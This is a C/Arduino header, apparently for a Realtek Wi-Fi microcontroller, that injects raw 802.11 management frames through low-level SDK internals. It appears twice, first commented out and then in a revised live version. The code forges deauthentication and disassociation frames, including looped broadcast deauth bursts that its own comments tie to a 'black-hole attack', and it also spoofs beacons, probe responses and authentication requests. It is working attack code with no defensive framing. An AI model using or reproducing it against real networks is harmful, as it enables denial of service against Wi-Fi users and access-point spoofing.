
// #ifndef PACKET_INJECTION_H
// #define PACKET_INJECTION_H

// #include <Arduino.h>

// // ==========================================================
// // 1. 结构体定义 (强制对齐，防止发畸形包)
// // ==========================================================
// typedef struct __attribute__((packed, aligned(4))) {
//   uint16_t frame_control = 0xC0; // Deauth
//   uint16_t duration = 0xFFFF;
//   uint8_t destination[6];
//   uint8_t source[6];
//   uint8_t access_point[6];
//   const uint16_t sequence_number = 0;
//   uint16_t reason = 0x06;
// } DeauthFrame;

// // 新增：Disassociation 帧结构 (用于黑洞攻击)
// typedef struct __attribute__((packed, aligned(4))) {
//   uint16_t frame_control = 0xA0; // Disassociation
//   uint16_t duration = 0xFFFF;
//   uint8_t destination[6];
//   uint8_t source[6];
//   uint8_t access_point[6];
//   const uint16_t sequence_number = 0;
//   uint16_t reason = 0x08; // Leaving BSS
// } DisassocFrame;

// typedef struct __attribute__((packed, aligned(4))) {
//   uint16_t frame_control = 0x80;
//   uint16_t duration = 0;
//   uint8_t destination[6];
//   uint8_t source[6];
//   uint8_t access_point[6];
//   const uint16_t sequence_number = 0;
//   const uint64_t timestamp = 0;
//   uint16_t beacon_interval = 0x64;
//   uint16_t ap_capabilities = 0x21;
//   const uint8_t ssid_tag = 0;
//   uint8_t ssid_length = 0;
//   uint8_t ssid[255];
// } BeaconFrame;

// typedef struct __attribute__((packed, aligned(4))) {
//   uint16_t frame_control = 0x50;      
//   uint16_t duration = 0;              
//   uint8_t destination[6];             
//   uint8_t source[6];                  
//   uint8_t access_point[6];            
//   const uint16_t sequence_number = 0; 
//   const uint64_t timestamp = 0;       
//   uint16_t beacon_interval = 0x64;    
//   uint16_t ap_capabilities = 0x21;    
//   const uint8_t ssid_tag = 0;         
//   uint8_t ssid_length = 0;            
//   uint8_t ssid[255];                  
// } ProbeRespFrame;

// typedef struct __attribute__((packed, aligned(4))) {
//   uint16_t frame_control = 0xB0;      
//   uint16_t duration = 0;
//   uint8_t destination[6];             
//   uint8_t source[6];                  
//   uint8_t bssid[6];                   
//   const uint16_t sequence_number = 0;
//   uint16_t auth_algorithm = 0x0000;   
//   uint16_t auth_sequence = 0x0001;    
//   uint16_t status_code = 0x0000;      
// } AuthReqFrame;

// // ==========================================================
// // 2. SDK 底层 C 函数声明
// // ==========================================================
// extern uint8_t* rltk_wlan_info;
// extern "C" {
//     void* alloc_mgtxmitframe(void* ptr);
//     void update_mgntframe_attrib(void* ptr, void* frame_control);
//     int dump_mgntframe(void* ptr, void* frame_control);
// }

// // ==========================================================
// // 3. 核心火力实现
// // ==========================================================
// inline void wifi_tx_raw_frame(void* frame, size_t length) {
//   uint8_t *ptr = (uint8_t *)**(uint32_t **)(rltk_wlan_info + 0x10);
//   uint8_t *frame_control = (uint8_t *)alloc_mgtxmitframe(ptr + 0xa80);

//   if (frame_control != 0) {
//     update_mgntframe_attrib(ptr, frame_control + 8);
//     memset((void *)*(uint32_t *)(frame_control + 0x80), 0, 0x68);
//     uint8_t *frame_data = (uint8_t *)*(uint32_t *)(frame_control + 0x80) + 0x28;
//     memcpy(frame_data, frame, length);
//     *(uint32_t *)(frame_control + 0x14) = length;
//     *(uint32_t *)(frame_control + 0x18) = length;
//     dump_mgntframe(ptr, frame_control);
//   }
// }

// inline void wifi_tx_deauth_frame(void* src_mac, void* dst_mac, uint16_t reason = 0x06) {
//   DeauthFrame frame;
//   memcpy(&frame.source, src_mac, 6);
//   memcpy(&frame.access_point, src_mac, 6);
//   memcpy(&frame.destination, dst_mac, 6);
//   frame.reason = reason;
//   wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
// }

// // 新增：广播级解除关联 (专门用于黑洞攻击)
// inline void wifi_tx_broadcast_disassoc(void* bssid, uint16_t reason = 0x08) {
//   uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
//   DisassocFrame frame;
//   memcpy(&frame.source, bssid, 6);
//   memcpy(&frame.access_point, bssid, 6);
//   memcpy(&frame.destination, broadcast, 6);
//   frame.reason = reason;
//   wifi_tx_raw_frame(&frame, sizeof(DisassocFrame));
// }

// inline void wifi_tx_beacon_frame(void* src_mac, void* dst_mac, const char *ssid) {
//   BeaconFrame frame;
//   memcpy(&frame.source, src_mac, 6);
//   memcpy(&frame.access_point, src_mac, 6);
//   memcpy(&frame.destination, dst_mac, 6);
//   for (int i = 0; ssid[i] != '\0'; i++) {
//     frame.ssid[i] = ssid[i];
//     frame.ssid_length++;
//   }
//   wifi_tx_raw_frame(&frame, 38 + frame.ssid_length);
// }

// inline void wifi_tx_probe_resp_frame(void* src_mac, void* dst_mac, const char *ssid) {
//   ProbeRespFrame frame;
//   memcpy(&frame.source, src_mac, 6);
//   memcpy(&frame.access_point, src_mac, 6);
//   memcpy(&frame.destination, dst_mac, 6);
//   frame.ssid_length = 0;
//   for (int i = 0; ssid[i] != '\0'; i++) {
//     frame.ssid[i] = ssid[i];
//     frame.ssid_length++;
//   }
//   wifi_tx_raw_frame(&frame, 38 + frame.ssid_length);
// }

// inline void wifi_tx_auth_req(void* sta_mac, void* bssid) {
//   AuthReqFrame frame;
//   memcpy(&frame.source, sta_mac, 6);
//   memcpy(&frame.destination, bssid, 6);
//   memcpy(&frame.bssid, bssid, 6);
//   frame.auth_algorithm = 0x0000; 
//   frame.auth_sequence = 0x0001;
//   frame.status_code = 0x0000;
//   wifi_tx_raw_frame(&frame, sizeof(AuthReqFrame));
// }

// inline void wifi_tx_broadcast_deauth(void* bssid, uint16_t reason, int burstCount, int interDelayUs) {
//   uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
//   DeauthFrame frame;
//   memcpy(&frame.source, bssid, 6);
//   memcpy(&frame.access_point, bssid, 6);
//   memcpy(&frame.destination, broadcast, 6);
//   frame.reason = reason;
//   for (int i = 0; i < burstCount; i++) {
//     wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
//     if (interDelayUs > 0) delayMicroseconds(interDelayUs);
//   }
// }

// #endif




#ifndef PACKET_INJECTION_H
#define PACKET_INJECTION_H

#include <Arduino.h>

// ==========================================================
// 1. 结构体定义 (强制对齐，防止发畸形包)
// ==========================================================
typedef struct __attribute__((packed, aligned(4))) {
  uint16_t frame_control = 0xC0; // Deauth
  uint16_t duration = 0xFFFF;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint16_t reason = 0x06;
} DeauthFrame;

// Disassociation 帧结构 (用于黑洞攻击)
typedef struct __attribute__((packed, aligned(4))) {
  uint16_t frame_control = 0xA0; // Disassociation
  uint16_t duration = 0xFFFF;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint16_t reason = 0x08; // Leaving BSS
} DisassocFrame;

typedef struct __attribute__((packed, aligned(4))) {
  uint16_t frame_control = 0x80;
  uint16_t duration = 0;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  const uint64_t timestamp = 0;
  uint16_t beacon_interval = 0x64;
  uint16_t ap_capabilities = 0x21;
  const uint8_t ssid_tag = 0;
  uint8_t ssid_length = 0;
  uint8_t ssid[255];
} BeaconFrame;

typedef struct __attribute__((packed, aligned(4))) {
  uint16_t frame_control = 0x50;      
  uint16_t duration = 0;              
  uint8_t destination[6];             
  uint8_t source[6];                  
  uint8_t access_point[6];            
  const uint16_t sequence_number = 0; 
  const uint64_t timestamp = 0;       
  uint16_t beacon_interval = 0x64;    
  uint16_t ap_capabilities = 0x21;    
  const uint8_t ssid_tag = 0;         
  uint8_t ssid_length = 0;            
  uint8_t ssid[255];                  
} ProbeRespFrame;

typedef struct __attribute__((packed, aligned(4))) {
  uint16_t frame_control = 0xB0;      
  uint16_t duration = 0;
  uint8_t destination[6];             
  uint8_t source[6];                  
  uint8_t bssid[6];                   
  const uint16_t sequence_number = 0;
  uint16_t auth_algorithm = 0x0000;   
  uint16_t auth_sequence = 0x0001;    
  uint16_t status_code = 0x0000;      
} AuthReqFrame;

// ==========================================================
// 2. SDK 底层 C 函数声明
// ==========================================================
extern uint8_t* rltk_wlan_info;
extern "C" {
    void* alloc_mgtxmitframe(void* ptr);
    void update_mgntframe_attrib(void* ptr, void* frame_control);
    int dump_mgntframe(void* ptr, void* frame_control);
}

// ==========================================================
// 3. 核心火力实现 & 预构建构建器 (Builders)
// ==========================================================
inline void wifi_tx_raw_frame(void* frame, size_t length) {
  uint8_t *ptr = (uint8_t *)**(uint32_t **)(rltk_wlan_info + 0x10);
  uint8_t *frame_control = (uint8_t *)alloc_mgtxmitframe(ptr + 0xa80);

  if (frame_control != 0) {
    update_mgntframe_attrib(ptr, frame_control + 8);
    memset((void *)*(uint32_t *)(frame_control + 0x80), 0, 0x68);
    uint8_t *frame_data = (uint8_t *)*(uint32_t *)(frame_control + 0x80) + 0x28;
    memcpy(frame_data, frame, length);
    *(uint32_t *)(frame_control + 0x14) = length;
    *(uint32_t *)(frame_control + 0x18) = length;
    dump_mgntframe(ptr, frame_control);
  }
}

// 新增：预构建 Beacon 帧到内存，不立即发送 (用于提速)
inline size_t wifi_build_beacon_frame(void* src_mac, void* dst_mac, const char *ssid, BeaconFrame &out) {
  memcpy(&out.source, src_mac, 6);
  memcpy(&out.access_point, src_mac, 6);
  memcpy(&out.destination, dst_mac, 6);
  out.ssid_length = 0;
  // 修复：增加 i < 255 安全边界，防止内存溢出
  for (int i = 0; ssid[i] != '\0' && i < 255; i++) {
    out.ssid[i] = ssid[i];
    out.ssid_length++;
  }
  return 38 + out.ssid_length;
}

// 新增：预构建 Probe Response 帧到内存，不立即发送
inline size_t wifi_build_probe_resp_frame(void* src_mac, void* dst_mac, const char *ssid, ProbeRespFrame &out) {
  memcpy(&out.source, src_mac, 6);
  memcpy(&out.access_point, src_mac, 6);
  memcpy(&out.destination, dst_mac, 6);
  out.ssid_length = 0;
  for (int i = 0; ssid[i] != '\0' && i < 255; i++) {
    out.ssid[i] = ssid[i];
    out.ssid_length++;
  }
  return 38 + out.ssid_length;
}

inline void wifi_tx_deauth_frame(void* src_mac, void* dst_mac, uint16_t reason = 0x06) {
  DeauthFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
}

inline void wifi_tx_broadcast_disassoc(void* bssid, uint16_t reason = 0x08) {
  uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  DisassocFrame frame;
  memcpy(&frame.source, bssid, 6);
  memcpy(&frame.access_point, bssid, 6);
  memcpy(&frame.destination, broadcast, 6);
  frame.reason = reason;
  wifi_tx_raw_frame(&frame, sizeof(DisassocFrame));
}

inline void wifi_tx_beacon_frame(void* src_mac, void* dst_mac, const char *ssid) {
  BeaconFrame frame;
  size_t len = wifi_build_beacon_frame(src_mac, dst_mac, ssid, frame);
  wifi_tx_raw_frame(&frame, len);
}

inline void wifi_tx_probe_resp_frame(void* src_mac, void* dst_mac, const char *ssid) {
  ProbeRespFrame frame;
  size_t len = wifi_build_probe_resp_frame(src_mac, dst_mac, ssid, frame);
  wifi_tx_raw_frame(&frame, len);
}

inline void wifi_tx_auth_req(void* sta_mac, void* bssid) {
  AuthReqFrame frame;
  memcpy(&frame.source, sta_mac, 6);
  memcpy(&frame.destination, bssid, 6);
  memcpy(&frame.bssid, bssid, 6);
  frame.auth_algorithm = 0x0000; 
  frame.auth_sequence = 0x0001;
  frame.status_code = 0x0000;
  wifi_tx_raw_frame(&frame, sizeof(AuthReqFrame));
}

inline void wifi_tx_broadcast_deauth(void* bssid, uint16_t reason, int burstCount, int interDelayUs) {
  uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  DeauthFrame frame;
  memcpy(&frame.source, bssid, 6);
  memcpy(&frame.access_point, bssid, 6);
  memcpy(&frame.destination, broadcast, 6);
  frame.reason = reason;
  for (int i = 0; i < burstCount; i++) {
    wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
    if (interDelayUs > 0) delayMicroseconds(interDelayUs);
  }
}

#endif